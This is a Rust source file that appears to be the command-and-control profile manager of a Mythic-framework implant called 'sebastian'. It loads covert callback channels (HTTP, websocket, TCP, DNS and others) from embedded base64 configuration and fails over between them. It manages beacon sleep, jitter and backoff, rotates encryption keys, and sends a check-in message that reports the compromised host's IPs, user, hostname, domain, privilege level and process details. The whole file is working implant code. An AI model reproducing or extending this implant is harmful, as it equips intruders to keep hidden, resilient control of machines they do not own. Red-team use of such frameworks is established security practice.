pub mod http;
pub mod websocket;
pub mod tcp;
pub mod dns;
pub mod httpx;
pub mod dynamichttp;

use crate::structs::{
    CheckInMessage, MythicMessage, P2PConnectionMessage, Profile,
};
use crate::utils;
use crate::responses;
use std::collections::HashMap;
use std::sync::{Arc, RwLock};
use std::time::Duration;
use tokio::sync::mpsc;

// ============================================================================
// Build-time configuration (injected via env!() macros from build.rs)
// ============================================================================

/// UUID assigned by Mythic during payload creation
pub fn get_uuid() -> String {
    option_env!("AGENT_UUID")
        .unwrap_or("00000000-0000-0000-0000-000000000000")
        .to_string()
}

/// Base64 encoded egress order JSON array
fn get_egress_order_b64() -> String {
    option_env!("EGRESS_ORDER").unwrap_or("W10=").to_string() // default: "[]" base64
}

fn get_egress_failover() -> String {
    option_env!("EGRESS_FAILOVER")
        .unwrap_or("failover")
        .to_string()
}

fn get_failed_threshold_str() -> String {
    option_env!("FAILED_CONNECTION_COUNT_THRESHOLD")
        .unwrap_or("10")
        .to_string()
}

// ============================================================================
// Profile Manager State
// ============================================================================

lazy_static::lazy_static! {
    /// Available C2 profiles
    static ref AVAILABLE_C2_PROFILES: RwLock<HashMap<String, Arc<dyn Profile>>> =
        RwLock::new(HashMap::new());

    /// Egress order (list of profile names in priority order)
    static ref EGRESS_ORDER: RwLock<Vec<String>> = RwLock::new(Vec::new());

    /// Failed connection counts per profile
    static ref FAILED_CONNECTION_COUNTS: RwLock<HashMap<String, i32>> = RwLock::new(HashMap::new());

    /// Current Mythic UUID (set after successful checkin/staging)
    static ref MYTHIC_ID: RwLock<String> = RwLock::new(String::new());

    /// P2P connection message channel
    static ref P2P_MSG_TX: RwLock<Option<mpsc::Sender<P2PConnectionMessage>>> = RwLock::new(None);
}

static CURRENT_CONNECTION_ID: std::sync::atomic::AtomicI32 = std::sync::atomic::AtomicI32::new(0);
static FAILED_CONNECTION_THRESHOLD: std::sync::atomic::AtomicI32 =
    std::sync::atomic::AtomicI32::new(10);
static BACKOFF_DELAY: std::sync::atomic::AtomicI32 = std::sync::atomic::AtomicI32::new(5);
static BACKOFF_SECONDS: std::sync::atomic::AtomicI32 = std::sync::atomic::AtomicI32::new(1);

// ============================================================================
// Profile Registration & Lifecycle
// ============================================================================

/// Register a C2 profile for use
pub fn register_available_c2_profile(profile: Arc<dyn Profile>) {
    let mut profiles = AVAILABLE_C2_PROFILES.write().expect("Profiles lock");
    profiles.insert(profile.profile_name().to_string(), profile);
}

/// Initialize profiles from build-time configuration
pub fn initialize() {
    use base64::engine::general_purpose::STANDARD as BASE64;
    use base64::Engine;

    let egress_order_b64 = get_egress_order_b64();
    let egress_order_bytes = match BASE64.decode(&egress_order_b64) {
        Ok(b) => b,
        Err(e) => {
            log::error!("Failed to parse egress order bytes: {}", e);
            return;
        }
    };

    let order: Vec<String> = match serde_json::from_slice(&egress_order_bytes) {
        Ok(o) => o,
        Err(e) => {
            log::error!("Failed to parse connection orders: {}", e);
            return;
        }
    };

    {
        let mut egress = EGRESS_ORDER.write().expect("Egress order lock");
        *egress = order.clone();
    }

    {
        let mut counts = FAILED_CONNECTION_COUNTS.write().expect("Failed counts lock");
        for key in &order {
            counts.insert(key.clone(), 0);
        }
    }

    let threshold: i32 = get_failed_threshold_str().parse().unwrap_or_else(|e| {
        utils::print_debug(&format!("Setting failedConnectionCountThreshold to 10: {}", e));
        10
    });
    FAILED_CONNECTION_THRESHOLD.store(threshold, std::sync::atomic::Ordering::Relaxed);

    eprintln!("[sebastian] Initial egress order: {:?}", order);

    // Register C2 profiles from compile-time config env vars
    // Each env var is base64-encoded JSON set by builder.go during payload build
    register_profiles_from_config(&BASE64);
}

/// Decode a base64 config string and deserialize into the target type
fn decode_profile_config<T: serde::de::DeserializeOwned>(
    b64_config: &str,
    profile_name: &str,
) -> Option<T> {
    use base64::engine::general_purpose::STANDARD as BASE64;
    use base64::Engine;

    let bytes = match BASE64.decode(b64_config) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[sebastian] Failed to base64 decode {} config: {}", profile_name, e);
            return None;
        }
    };
    eprintln!("[sebastian] {} raw config: {}", profile_name, String::from_utf8_lossy(&bytes));
    match serde_json::from_slice(&bytes) {
        Ok(config) => Some(config),
        Err(e) => {
            eprintln!("[sebastian] Failed to parse {} config: {}", profile_name, e);
            None
        }
    }
}

/// Register all C2 profiles that have compile-time configuration
fn register_profiles_from_config<E: base64::Engine>(_engine: &E) {
    // HTTP profile
    if let Some(config_b64) = option_env!("C2_HTTP_INITIAL_CONFIG") {
        eprintln!("[sebastian] Found HTTP config, decoding...");
        if let Some(config) = decode_profile_config::<http::HttpInitialConfig>(config_b64, "http") {
            eprintln!("[sebastian] Registering HTTP profile -> {}:{}", config.callback_host, config.callback_port);
            register_available_c2_profile(Arc::new(http::HttpProfile::new(config)));
        } else {
            eprintln!("[sebastian] FAILED to decode HTTP config");
        }
    } else {
        eprintln!("[sebastian] No C2_HTTP_INITIAL_CONFIG found at compile time");
    }

    // Websocket profile
    if let Some(config_b64) = option_env!("C2_WEBSOCKET_INITIAL_CONFIG") {
        if let Some(config) = decode_profile_config::<websocket::WebsocketInitialConfig>(config_b64, "websocket") {
            utils::print_debug("Registering Websocket profile");
            register_available_c2_profile(Arc::new(websocket::WebsocketProfile::new(config)));
        }
    }

    // TCP profile
    if let Some(config_b64) = option_env!("C2_TCP_INITIAL_CONFIG") {
        if let Some(config) = decode_profile_config::<tcp::TcpInitialConfig>(config_b64, "tcp") {
            utils::print_debug("Registering TCP profile");
            register_available_c2_profile(Arc::new(tcp::TcpProfile::new(config)));
        }
    }

    // DNS profile
    if let Some(config_b64) = option_env!("C2_DNS_INITIAL_CONFIG") {
        if let Some(config) = decode_profile_config::<dns::DnsInitialConfig>(config_b64, "dns") {
            utils::print_debug("Registering DNS profile");
            register_available_c2_profile(Arc::new(dns::DnsProfile::new(config)));
        }
    }

    // HTTPx profile
    if let Some(config_b64) = option_env!("C2_HTTPX_INITIAL_CONFIG") {
        if let Some(config) = decode_profile_config::<httpx::HttpxInitialConfig>(config_b64, "httpx") {
            utils::print_debug("Registering HTTPx profile");
            register_available_c2_profile(Arc::new(httpx::HttpxProfile::new(config)));
        }
    }

    // Dynamic HTTP profile
    if let Some(config_b64) = option_env!("C2_DYNAMICHTTP_INITIAL_CONFIG") {
        if let Some(config) = decode_profile_config::<dynamichttp::DynamicHttpInitialConfig>(config_b64, "dynamichttp") {
            utils::print_debug("Registering DynamicHTTP profile");
            register_available_c2_profile(Arc::new(dynamichttp::DynamicHttpProfile::new(config)));
        }
    }
}

/// Start egress and P2P profiles
pub async fn start() {
    let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
    let mut egress_order = EGRESS_ORDER.write().expect("Egress order lock");

    // Build installed C2 list: egress order first, then any extras
    let mut installed_c2 = Vec::new();
    for egress_c2 in egress_order.iter() {
        if profiles.contains_key(egress_c2) {
            installed_c2.push(egress_c2.clone());
        }
    }
    for c2 in profiles.keys() {
        if !installed_c2.contains(c2) {
            installed_c2.push(c2.clone());
        }
    }
    *egress_order = installed_c2.clone();
    eprintln!("[sebastian] Fixed egress order: {:?}", *egress_order);
    eprintln!("[sebastian] Registered profiles: {:?}", profiles.keys().collect::<Vec<_>>());

    // Start first matching egress profile
    let current_id = CURRENT_CONNECTION_ID.load(std::sync::atomic::Ordering::Relaxed) as usize;
    for (i, egress_c2) in egress_order.iter().enumerate() {
        if i == current_id {
            if let Some(profile) = profiles.get(egress_c2) {
                if !profile.is_p2p() {
                    eprintln!("[sebastian] Starting egress profile: {}", egress_c2);
                    let p = profile.clone();
                    tokio::spawn(async move {
                        p.start().await;
                    });
                    break;
                }
            }
        }
    }

    // Start all P2P profiles
    for (name, profile) in profiles.iter() {
        if profile.is_p2p() {
            utils::print_debug(&format!("Starting P2P: {}", name));
            let p = profile.clone();
            tokio::spawn(async move {
                p.start().await;
            });
        }
    }
    drop(profiles);
    drop(egress_order);

    // Wait forever
    let (_tx, mut rx) = mpsc::channel::<bool>(1);
    rx.recv().await;
}

/// Increment failed connection count for a profile, potentially rotating
pub fn increment_failed_connection(c2_name: &str) {
    let mut counts = FAILED_CONNECTION_COUNTS.write().expect("Failed counts lock");
    let count = counts.entry(c2_name.to_string()).or_insert(0);
    *count += 1;
    let threshold = FAILED_CONNECTION_THRESHOLD.load(std::sync::atomic::Ordering::Relaxed);
    if *count > threshold {
        let name = c2_name.to_string();
        *count = 0;
        drop(counts);
        tokio::spawn(async move {
            start_next_egress(&name).await;
        });
    }
}

/// Stop current profile and start next one
pub async fn start_next_egress(failed_profile: &str) {
    utils::print_debug("Looping to start next egress protocol");

    let mut started_c2 = String::new();
    let mut p2p_tx_clone: Option<mpsc::Sender<P2PConnectionMessage>> = None;

    // Scope to drop all RwLock guards before any .await
    {
        let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
        let egress_order = EGRESS_ORDER.read().expect("Egress order lock");

        // Stop the failed profile
        for key in egress_order.iter() {
            if key == failed_profile {
                if let Some(profile) = profiles.get(key) {
                    if !profile.is_p2p() {
                        utils::print_debug(&format!("Stopping: {}", key));
                        let mut counts = FAILED_CONNECTION_COUNTS.write().expect("Failed counts lock");
                        counts.insert(key.clone(), 0);
                        profile.stop();
                        break;
                    }
                }
            }
        }

        // Check if any egress is still running
        let egress_still_running = profiles
            .values()
            .any(|p| !p.is_p2p() && p.is_running());

        if !egress_still_running {
            utils::print_debug("No more egress C2 profiles running, starting next");
            let failover = get_egress_failover();
            if failover == "failover" {
                let new_id = (CURRENT_CONNECTION_ID.load(std::sync::atomic::Ordering::Relaxed) + 1)
                    % egress_order.len() as i32;
                CURRENT_CONNECTION_ID.store(new_id, std::sync::atomic::Ordering::Relaxed);
            }

            let current_id = CURRENT_CONNECTION_ID.load(std::sync::atomic::Ordering::Relaxed) as usize;
            for (i, key) in egress_order.iter().enumerate() {
                if i == current_id {
                    if let Some(profile) = profiles.get(key) {
                        if !profile.is_p2p() {
                            utils::print_debug(&format!("Starting: {}", key));
                            started_c2 = key.clone();
                            let mut counts =
                                FAILED_CONNECTION_COUNTS.write().expect("Failed counts lock");
                            counts.insert(key.clone(), 0);
                            let p = profile.clone();
                            tokio::spawn(async move {
                                p.start().await;
                            });
                            break;
                        }
                    }
                }
            }
        }

        // Clone the P2P tx sender if we need it
        if !get_mythic_id().is_empty() && !started_c2.is_empty() && started_c2 != failed_profile {
            p2p_tx_clone = P2P_MSG_TX.read().expect("P2P tx lock").clone();
        }
    }
    // All RwLock guards dropped here

    // Send edge removal if we started a different profile
    if let Some(tx) = p2p_tx_clone {
        let _ = tx
            .send(P2PConnectionMessage {
                source: get_mythic_id(),
                destination: get_mythic_id(),
                action: "remove".to_string(),
                c2_profile: failed_profile.to_string(),
            })
            .await;
    }
}

// ============================================================================
// Profile Information & Configuration
// ============================================================================

pub fn get_all_c2_info() -> String {
    let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
    let mut output = String::new();
    for (name, profile) in profiles.iter() {
        output.push_str(&format!("{}:\n{}\n", name, profile.get_config()));
    }
    output
}

pub fn set_all_encryption_keys(new_key: &str) {
    let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
    for (name, profile) in profiles.iter() {
        utils::print_debug(&format!("Updating encryption keys for: {}", name));
        profile.set_encryption_key(new_key);
    }
}

pub fn start_c2_profile(profile_name: &str) {
    let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
    if let Some(profile) = profiles.get(profile_name) {
        utils::print_debug(&format!("Starting profile by name: {}", profile_name));
        let p = profile.clone();
        tokio::spawn(async move {
            p.start().await;
        });
    }
}

pub fn stop_c2_profile(profile_name: &str) {
    let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
    if let Some(profile) = profiles.get(profile_name) {
        utils::print_debug(&format!("Stopping: {}", profile_name));
        let mut counts = FAILED_CONNECTION_COUNTS.write().expect("Failed counts lock");
        counts.insert(profile_name.to_string(), 0);
        profile.stop();
    }
    drop(profiles);
    let name = profile_name.to_string();
    tokio::spawn(async move {
        start_next_egress(&name).await;
    });
}

pub fn update_all_sleep_interval(new_interval: i32) -> String {
    let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
    let mut output = String::new();
    for (name, profile) in profiles.iter() {
        output.push_str(&format!("[{}] - {}", name, profile.set_sleep_interval(new_interval)));
    }
    output
}

pub fn update_all_sleep_jitter(new_jitter: i32) -> String {
    let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
    let mut output = String::new();
    for (name, profile) in profiles.iter() {
        output.push_str(&format!("[{}] - {}", name, profile.set_sleep_jitter(new_jitter)));
    }
    output
}

pub fn update_all_sleep_backoff_delay(new_delay: i32) -> String {
    let delay = if new_delay < 0 { 0 } else { new_delay };
    BACKOFF_DELAY.store(delay, std::sync::atomic::Ordering::Relaxed);
    format!("Updated Backoff Delay to {} seconds\n", delay)
}

pub fn update_all_sleep_backoff_seconds(new_seconds: i32) -> String {
    let secs = if new_seconds < 0 { 0 } else { new_seconds };
    BACKOFF_SECONDS.store(secs, std::sync::atomic::Ordering::Relaxed);
    format!("Updated Backoff Seconds to {} seconds\n", secs)
}

pub fn update_c2_profile(profile_name: &str, arg_name: &str, arg_value: &str) {
    let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
    if let Some(profile) = profiles.get(profile_name) {
        profile.update_config(arg_name, arg_value);
    }
}

pub fn get_push_channel() -> Option<mpsc::Sender<MythicMessage>> {
    let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
    let mut has_egress = false;

    // Try direct egress push channels first
    for profile in profiles.values() {
        if !profile.is_p2p() {
            if let Some(ch) = profile.get_push_channel() {
                return Some(ch);
            }
            if profile.is_running() {
                has_egress = true;
            }
        }
    }

    // No egress at all? Check P2P
    if !has_egress {
        for profile in profiles.values() {
            if profile.is_p2p() {
                if let Some(ch) = profile.get_push_channel() {
                    return Some(ch);
                }
            }
        }
    }

    None
}

pub fn get_sleep_time() -> i32 {
    let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
    for profile in profiles.values() {
        if profile.is_p2p() || profile.get_push_channel().is_some() {
            continue;
        }
        if profile.is_running() {
            let sleep = profile.get_sleep_time();
            if sleep >= 0 {
                if sleep != 0 {
                    return sleep;
                }
                // Backoff logic: if at sleep 0 and it's been > backoff_delay since last real message
                let backoff_delay =
                    BACKOFF_DELAY.load(std::sync::atomic::Ordering::Relaxed) as u64;
                let elapsed = responses::get_last_message_time().elapsed();
                if elapsed > Duration::from_secs(backoff_delay) {
                    return BACKOFF_SECONDS.load(std::sync::atomic::Ordering::Relaxed);
                }
                return sleep;
            }
        }
    }
    0
}

pub fn get_mythic_id() -> String {
    MYTHIC_ID.read().expect("Mythic ID lock").clone()
}

pub fn set_mythic_id(new_id: &str) {
    utils::print_debug(&format!("Updating ID: {} -> {}", get_mythic_id(), new_id));
    let mut id = MYTHIC_ID.write().expect("Mythic ID lock");
    *id = new_id.to_string();
}

pub fn get_sleep_string() -> String {
    let profiles = AVAILABLE_C2_PROFILES.read().expect("Profiles lock");
    let mut info: HashMap<String, serde_json::Value> = HashMap::new();
    for (name, profile) in profiles.iter() {
        let mut profile_info = serde_json::Map::new();
        profile_info.insert(
            "interval".to_string(),
            serde_json::Value::Number(profile.get_sleep_interval().into()),
        );
        profile_info.insert(
            "jitter".to_string(),
            serde_json::Value::Number(profile.get_sleep_jitter().into()),
        );
        profile_info.insert(
            "killdate".to_string(),
            serde_json::Value::String(profile.get_kill_date().to_string()),
        );
        info.insert(name.clone(), serde_json::Value::Object(profile_info));
    }
    serde_json::to_string_pretty(&info).unwrap_or_default()
}

pub fn create_checkin_message() -> CheckInMessage {
    let integrity_level = if utils::is_elevated() { 3 } else { 2 };

    CheckInMessage {
        action: "checkin".to_string(),
        ips: utils::get_current_ip_address(),
        os: utils::get_os(),
        user: utils::get_user(),
        host: utils::get_hostname(),
        pid: utils::get_pid(),
        uuid: get_uuid(),
        architecture: utils::get_architecture(),
        domain: utils::get_domain(),
        integrity_level,
        external_ip: String::new(),
        process_name: utils::get_process_name(),
        sleep_info: get_sleep_string(),
        cwd: utils::get_cwd(),
    }
}
